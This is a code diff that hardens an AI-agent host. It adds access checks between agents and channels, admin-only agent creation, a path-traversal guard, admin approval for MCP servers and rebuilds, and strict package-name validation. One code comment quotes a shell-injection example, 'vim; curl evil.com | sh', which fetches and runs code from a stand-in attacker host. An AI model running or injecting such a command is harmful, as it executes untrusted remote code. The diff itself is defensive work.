@@ -19,8 +19,20 @@ import {
   getSession,
   createPendingApproval,
 } from './db/sessions.js';
-import { getAgentGroup, getAdminAgentGroup, createAgentGroup, updateAgentGroup } from './db/agent-groups.js';
-import { getMessagingGroupsByAgentGroup } from './db/messaging-groups.js';
+import {
+  getAgentGroup,
+  getAdminAgentGroup,
+  createAgentGroup,
+  updateAgentGroup,
+  getAgentGroupByFolder,
+} from './db/agent-groups.js';
+import {
+  createDestination,
+  getDestinationByName,
+  hasDestination,
+  normalizeName,
+} from './db/agent-destinations.js';
+import { getMessagingGroupByPlatform, getMessagingGroupsByAgentGroup } from './db/messaging-groups.js';
 import { log } from './log.js';
 import {
   openInboundDb,
@@ -60,6 +72,83 @@ let sweepPolling = false;
 
 export function setDeliveryAdapter(adapter: ChannelDeliveryAdapter): void {
   deliveryAdapter = adapter;
+}
+
+/**
+ * Deliver a system notification to an agent as a regular chat message.
+ * Used for fire-and-forget responses from host actions (create_agent result,
+ * approval outcomes, etc.). The agent sees it as an inbound chat message
+ * with sender="system".
+ */
+function notifyAgent(session: Session, text: string): void {
+  writeSessionMessage(session.agent_group_id, session.id, {
+    id: `sys-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+    kind: 'chat',
+    timestamp: new Date().toISOString(),
+    platformId: session.agent_group_id,
+    channelType: 'agent',
+    threadId: null,
+    content: JSON.stringify({ text, sender: 'system', senderId: 'system' }),
+  });
+  // Wake the container so it picks up the notification promptly
+  const fresh = getSession(session.id);
+  if (fresh) {
+    wakeContainer(fresh).catch((err) => log.error('Failed to wake container after notification', { err }));
+  }
+}
+
+/**
+ * Send an approval request to the admin channel and record a pending_approval row.
+ * The admin's button click routes via the existing ncq: card infrastructure to
+ * handleApprovalResponse in index.ts, which completes the action.
+ */
+async function requestApproval(
+  session: Session,
+  agentName: string,
+  action: 'install_packages' | 'request_rebuild' | 'add_mcp_server',
+  payload: Record<string, unknown>,
+  question: string,
+): Promise<void> {
+  const adminGroup = getAdminAgentGroup();
+  const adminMGs = adminGroup ? getMessagingGroupsByAgentGroup(adminGroup.id) : [];
+  if (adminMGs.length === 0) {
+    notifyAgent(session, `${action} failed: no admin channel configured for approvals.`);
+    return;
+  }
+  const adminChannel = adminMGs[0];
+
+  const approvalId = `appr-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+  createPendingApproval({
+    approval_id: approvalId,
+    session_id: session.id,
+    request_id: approvalId, // fire-and-forget: no separate request id to correlate
+    action,
+    payload: JSON.stringify(payload),
+    created_at: new Date().toISOString(),
+  });
+
+  if (deliveryAdapter) {
+    try {
+      await deliveryAdapter.deliver(
+        adminChannel.channel_type,
+        adminChannel.platform_id,
+        null,
+        'chat-sdk',
+        JSON.stringify({
+          type: 'ask_question',
+          questionId: approvalId,
+          question,
+          options: ['Approve', 'Reject'],
+        }),
+      );
+    } catch (err) {
+      log.error('Failed to deliver approval card', { action, approvalId, err });
+      notifyAgent(session, `${action} failed: could not deliver approval request to admin.`);
+      return;
+    }
+  }
+
+  log.info('Approval requested', { action, approvalId, agentName });
 }
 
 /** Show typing indicator on a channel. Called when a message is routed to the agent. */
@@ -227,10 +316,25 @@ async function deliverMessage(
     return;
   }
 
-  // Agent-to-agent — route to target session
+  // Agent-to-agent — route to target session (with permission check)
   if (msg.channel_type === 'agent') {
     await routeAgentMessage(msg, session);
     return;
+  }
+
+  // Permission check: the source agent must have a destination row for this target.
+  // Defense in depth — the container already validates via its local map, but the
+  // host's central DB is the authoritative ACL.
+  if (msg.channel_type && msg.platform_id) {
+    const mg = getMessagingGroupByPlatform(msg.channel_type, msg.platform_id);
+    if (!mg || !hasDestination(session.agent_group_id, 'channel', mg.id)) {
+      log.warn('Unauthorized channel destination — dropping message', {
+        sourceAgentGroup: session.agent_group_id,
+        channelType: msg.channel_type,
+        platformId: msg.platform_id,
+      });
+      return;
+    }
   }
 
   // Track pending questions for ask_user_question flow
@@ -293,7 +397,13 @@ async function deliverMessage(
   return platformMsgId;
 }
 
-/** Route an agent-to-agent message to the target agent's session. */
+/**
+ * Route an agent-to-agent message to the target agent's session.
+ *
+ * Permission is enforced via agent_destinations — the source agent must have
+ * a row for the target. Content is copied verbatim; the target's formatter
+ * will look up the source agent in its own local map to display a name.
+ */
 async function routeAgentMessage(
   msg: { id: string; platform_id: string | null; content: string },
   sourceSession: Session,
@@ -304,35 +414,29 @@ async function routeAgentMessage(
     return;
   }
 
-  const targetGroup = getAgentGroup(targetAgentGroupId);
-  if (!targetGroup) {
+  if (!hasDestination(sourceSession.agent_group_id, 'agent', targetAgentGroupId)) {
+    log.warn('Unauthorized agent-to-agent message — dropping', {
+      source: sourceSession.agent_group_id,
+      target: targetAgentGroupId,
+    });
+    return;
+  }
+
+  if (!getAgentGroup(targetAgentGroupId)) {
     log.warn('Target agent group not found', { id: msg.id, targetAgentGroupId });
     return;
   }
 
-  const sourceGroup = getAgentGroup(sourceSession.agent_group_id);
-  const sourceAgentName = sourceGroup?.name || sourceSession.agent_group_id;
-
-  // Find or create a session for the target agent
   const { session: targetSession } = resolveSession(targetAgentGroupId, null, null, 'agent-shared');
 
-  // Enrich content with sender info
-  const content = JSON.parse(msg.content);
-  const enrichedContent = JSON.stringify({
-    text: content.text,
-    sender: sourceAgentName,
-    senderId: sourceSession.agent_group_id,
-  });
-
-  const messageId = `agent-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
   writeSessionMessage(targetAgentGroupId, targetSession.id, {
-    id: messageId,
+    id: `a2a-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
     kind: 'chat',
     timestamp: new Date().toISOString(),
     platformId: sourceSession.agent_group_id,
     channelType: 'agent',
     threadId: null,
-    content: enrichedContent,
+    content: msg.content,
   });
 
   log.info('Agent message routed', {
@@ -341,10 +445,8 @@ async function routeAgentMessage(
     targetSession: targetSession.id,
   });
 
-  const freshSession = getSession(targetSession.id);
-  if (freshSession) {
-    await wakeContainer(freshSession);
-  }
+  const fresh = getSession(targetSession.id);
+  if (fresh) await wakeContainer(fresh);
 }
 
 /** Ensure the delivered table has new columns (migration for existing sessions). */
@@ -436,205 +538,176 @@ async function handleSystemAction(
     case 'create_agent': {
       const requestId = content.requestId as string;
       const name = content.name as string;
-      let folder =
-        (content.folder as string) ||
-        name
-          .toLowerCase()
-          .replace(/[^a-z0-9_-]/g, '_')
-          .replace(/_+/g, '_');
       const instructions = content.instructions as string | null;
 
-      try {
-        // Avoid duplicate folders
-        const { getAgentGroupByFolder } = await import('./db/agent-groups.js');
-        if (getAgentGroupByFolder(folder)) {
-          folder = `${folder}_${Date.now()}`;
-        }
-
-        const agentGroupId = `ag-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
-
-        createAgentGroup({
-          id: agentGroupId,
-          name,
-          folder,
-          is_admin: 0,
-          agent_provider: null,
-          container_config: null,
-          created_at: new Date().toISOString(),
-        });
-
-        const groupPath = path.join(GROUPS_DIR, folder);
-        fs.mkdirSync(groupPath, { recursive: true });
-
-        if (instructions) {
-          fs.writeFileSync(path.join(groupPath, 'CLAUDE.md'), instructions);
-        }
-
-        writeSystemResponse(session.agent_group_id, session.id, requestId, 'success', {
-          agentGroupId,
-          name,
-          folder,
-        });
-
-        log.info('Agent group created via system action', { agentGroupId, name, folder });
-      } catch (e) {
-        writeSystemResponse(session.agent_group_id, session.id, requestId, 'error', {
-          error: e instanceof Error ? e.message : String(e),
-        });
+      const sourceGroup = getAgentGroup(session.agent_group_id);
+      if (!sourceGroup?.is_admin) {
+        // Notify the agent via a chat message (fire-and-forget pattern)
+        notifyAgent(session, `Your create_agent request for "${name}" was rejected: admin permission required.`);
+        log.warn('create_agent denied (not admin)', { sessionAgentGroup: session.agent_group_id, name });
+        break;
       }
+
+      const localName = normalizeName(name);
+
+      // Collision in the creator's destination namespace
+      if (getDestinationByName(sourceGroup.id, localName)) {
+        notifyAgent(session, `Cannot create agent "${name}": you already have a destination named "${localName}".`);
+        break;
+      }
+
+      // Derive a safe folder name, deduplicated globally across agent_groups.folder
+      let folder = localName;
+      let suffix = 2;
+      while (getAgentGroupByFolder(folder)) {
+        folder = `${localName}-${suffix}`;
+        suffix++;
+      }
+
+      const groupPath = path.join(GROUPS_DIR, folder);
+      const resolvedPath = path.resolve(groupPath);
+      const resolvedGroupsDir = path.resolve(GROUPS_DIR);
+      if (!resolvedPath.startsWith(resolvedGroupsDir + path.sep)) {
+        notifyAgent(session, `Cannot create agent "${name}": invalid folder path.`);
+        log.error('create_agent path traversal attempt', { folder, resolvedPath });
+        break;
+      }
+
+      const agentGroupId = `ag-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+      const now = new Date().toISOString();
+
+      createAgentGroup({
+        id: agentGroupId,
+        name,
+        folder,
+        is_admin: 0,
+        agent_provider: null,
+        container_config: null,
+        created_at: now,
+      });
+
+      fs.mkdirSync(groupPath, { recursive: true });
+      if (instructions) {
+        fs.writeFileSync(path.join(groupPath, 'CLAUDE.md'), instructions);
+      }
+
+      // Insert bidirectional destination rows (= ACL grants).
+      // Creator refers to child by the name it chose; child refers to creator as "parent".
+      createDestination({
+        agent_group_id: sourceGroup.id,
+        local_name: localName,
+        target_type: 'agent',
+        target_id: agentGroupId,
+        created_at: now,
+      });
+      // Handle the unlikely case where the child already has a "parent" destination
+      // (shouldn't happen for a brand-new agent, but be safe).
+      let parentName = 'parent';
+      let parentSuffix = 2;
+      while (getDestinationByName(agentGroupId, parentName)) {
+        parentName = `parent-${parentSuffix}`;
+        parentSuffix++;
+      }
+      createDestination({
+        agent_group_id: agentGroupId,
+        local_name: parentName,
+        target_type: 'agent',
+        target_id: sourceGroup.id,
+        created_at: now,
+      });
+
+      // Fire-and-forget notification back to the creator
+      notifyAgent(session, `Agent "${localName}" created. You can now message it with <message to="${localName}">...</message>.`);
+      log.info('Agent group created', { agentGroupId, name, localName, folder, parent: sourceGroup.id });
+      // Note: requestId is unused — this is fire-and-forget, not request/response.
+      void requestId;
       break;
     }
 
     case 'add_mcp_server': {
-      const requestId = content.requestId as string;
+      const agentGroup = getAgentGroup(session.agent_group_id);
+      if (!agentGroup) {
+        notifyAgent(session, 'add_mcp_server failed: agent group not found.');
+        break;
+      }
       const serverName = content.name as string;
       const command = content.command as string;
-      const serverArgs = content.args as string[];
-      const serverEnv = content.env as Record<string, string>;
-
-      try {
-        const agentGroup = getAgentGroup(session.agent_group_id);
-        if (!agentGroup) throw new Error('Agent group not found');
-
-        const containerConfig = agentGroup.container_config ? JSON.parse(agentGroup.container_config) : {};
-        if (!containerConfig.mcpServers) containerConfig.mcpServers = {};
-        containerConfig.mcpServers[serverName] = { command, args: serverArgs || [], env: serverEnv || {} };
-
-        updateAgentGroup(session.agent_group_id, { container_config: JSON.stringify(containerConfig) });
-
-        writeSystemResponse(session.agent_group_id, session.id, requestId, 'success', {
-          message: `MCP server "${serverName}" added. Will take effect on next container restart.`,
-        });
-
-        log.info('MCP server added', { agentGroupId: session.agent_group_id, name: serverName });
-      } catch (e) {
-        writeSystemResponse(session.agent_group_id, session.id, requestId, 'error', {
-          error: e instanceof Error ? e.message : String(e),
-        });
+      if (!serverName || !command) {
+        notifyAgent(session, 'add_mcp_server failed: name and command are required.');
+        break;
       }
+      await requestApproval(session, agentGroup.name, 'add_mcp_server', {
+        name: serverName,
+        command,
+        args: (content.args as string[]) || [],
+        env: (content.env as Record<string, string>) || {},
+      }, `Agent "${agentGroup.name}" requests a new MCP server:\n${serverName} (${command})`);
       break;
     }
 
     case 'install_packages': {
-      const requestId = content.requestId as string;
-      const apt = (content.apt as string[]) || [];
-      const npm = (content.npm as string[]) || [];
-      const reason = content.reason as string;
-
       const agentGroup = getAgentGroup(session.agent_group_id);
       if (!agentGroup) {
-        writeSystemResponse(session.agent_group_id, session.id, requestId, 'error', { error: 'Agent group not found' });
+        notifyAgent(session, 'install_packages failed: agent group not found.');
         break;
       }
 
-      // Find admin channel for approval card
-      const adminGroup = getAdminAgentGroup();
-      let approvalChannelType: string | null = null;
-      let approvalPlatformId: string | null = null;
+      const apt = (content.apt as string[]) || [];
+      const npm = (content.npm as string[]) || [];
+      const reason = (content.reason as string) || '';
 
-      if (adminGroup) {
-        const adminMGs = getMessagingGroupsByAgentGroup(adminGroup.id);
-        if (adminMGs.length > 0) {
-          approvalChannelType = adminMGs[0].channel_type;
-          approvalPlatformId = adminMGs[0].platform_id;
-        }
+      // Host-side sanitization (defense in depth — container should validate first).
+      // Strict allowlist: Debian/npm naming rules only. Blocks shell injection via
+      // package names like `vim; curl evil.com | sh`.
+      const APT_RE = /^[a-z0-9][a-z0-9._+-]*$/;
+      const NPM_RE = /^(@[a-z0-9][a-z0-9._-]*\/)?[a-z0-9][a-z0-9._-]*$/;
+      const MAX_PACKAGES = 20;
+      if (apt.length + npm.length === 0) {
+        notifyAgent(session, 'install_packages failed: at least one apt or npm package is required.');
+        break;
       }
-
-      if (!approvalChannelType || !approvalPlatformId) {
-        writeSystemResponse(session.agent_group_id, session.id, requestId, 'error', {
-          error: 'No admin channel found for approval',
-        });
+      if (apt.length + npm.length > MAX_PACKAGES) {
+        notifyAgent(session, `install_packages failed: max ${MAX_PACKAGES} packages per request.`);
+        break;
+      }
+      const invalidApt = apt.find((p) => !APT_RE.test(p));
+      if (invalidApt) {
+        notifyAgent(session, `install_packages failed: invalid apt package name "${invalidApt}".`);
+        log.warn('install_packages: invalid apt package rejected', { pkg: invalidApt });
+        break;
+      }
+      const invalidNpm = npm.find((p) => !NPM_RE.test(p));
+      if (invalidNpm) {
+        notifyAgent(session, `install_packages failed: invalid npm package name "${invalidNpm}".`);
+        log.warn('install_packages: invalid npm package rejected', { pkg: invalidNpm });
         break;
       }
 
-      const approvalId = `appr-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
-
-      createPendingApproval({
-        approval_id: approvalId,
-        session_id: session.id,
-        request_id: requestId,
-        action: 'install_packages',
-        payload: JSON.stringify({ apt, npm, reason }),
-        created_at: new Date().toISOString(),
-      });
-
-      const packageList = [...apt.map((p: string) => `apt: ${p}`), ...npm.map((p: string) => `npm: ${p}`)].join(', ');
-      if (deliveryAdapter) {
-        await deliveryAdapter.deliver(
-          approvalChannelType,
-          approvalPlatformId,
-          null,
-          'chat-sdk',
-          JSON.stringify({
-            type: 'ask_question',
-            questionId: approvalId,
-            question: `Agent "${agentGroup.name}" requests package installation:\n${packageList}${reason ? `\nReason: ${reason}` : ''}`,
-            options: ['Approve', 'Reject'],
-          }),
-        );
-      }
-
-      log.info('Package install approval requested', { approvalId, agentGroup: agentGroup.name, apt, npm });
+      const packageList = [...apt.map((p) => `apt: ${p}`), ...npm.map((p) => `npm: ${p}`)].join(', ');
+      await requestApproval(
+        session,
+        agentGroup.name,
+        'install_packages',
+        { apt, npm, reason },
+        `Agent "${agentGroup.name}" requests package installation:\n${packageList}${reason ? `\nReason: ${reason}` : ''}`,
+      );
       break;
     }
 
     case 'request_rebuild': {
-      const requestId = content.requestId as string;
-      const reason = content.reason as string;
-
       const agentGroup = getAgentGroup(session.agent_group_id);
       if (!agentGroup) {
-        writeSystemResponse(session.agent_group_id, session.id, requestId, 'error', { error: 'Agent group not found' });
+        notifyAgent(session, 'request_rebuild failed: agent group not found.');
         break;
       }
-
-      // Find admin channel for approval card
-      const adminGroup2 = getAdminAgentGroup();
-      let rebuildChannelType: string | null = null;
-      let rebuildPlatformId: string | null = null;
-
-      if (adminGroup2) {
-        const adminMGs2 = getMessagingGroupsByAgentGroup(adminGroup2.id);
-        if (adminMGs2.length > 0) {
-          rebuildChannelType = adminMGs2[0].channel_type;
-          rebuildPlatformId = adminMGs2[0].platform_id;
-        }
-      }
-
-      if (!rebuildChannelType || !rebuildPlatformId) {
-        writeSystemResponse(session.agent_group_id, session.id, requestId, 'error', {
-          error: 'No admin channel found for approval',
-        });
-        break;
-      }
-
-      const rebuildApprovalId = `appr-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
-
-      createPendingApproval({
-        approval_id: rebuildApprovalId,
-        session_id: session.id,
-        request_id: requestId,
-        action: 'request_rebuild',
-        payload: JSON.stringify({ reason }),
-        created_at: new Date().toISOString(),
-      });
-
-      if (deliveryAdapter) {
-        await deliveryAdapter.deliver(
-          rebuildChannelType,
-          rebuildPlatformId,
-          null,
-          'chat-sdk',
-          JSON.stringify({
-            type: 'ask_question',
-            questionId: rebuildApprovalId,
-            question: `Agent "${agentGroup.name}" requests a container rebuild.${reason ? `\nReason: ${reason}` : ''}`,
-            options: ['Approve', 'Reject'],
-          }),
-        );
-      }
-
-      log.info('Container rebuild approval requested', { approvalId: rebuildApprovalId, agentGroup: agentGroup.name });
+      const reason = (content.reason as string) || '';
+      await requestApproval(
+        session,
+        agentGroup.name,
+        'request_rebuild',
+        { reason },
+        `Agent "${agentGroup.name}" requests a container rebuild.${reason ? `\nReason: ${reason}` : ''}`,
+      );
       break;
     }
 
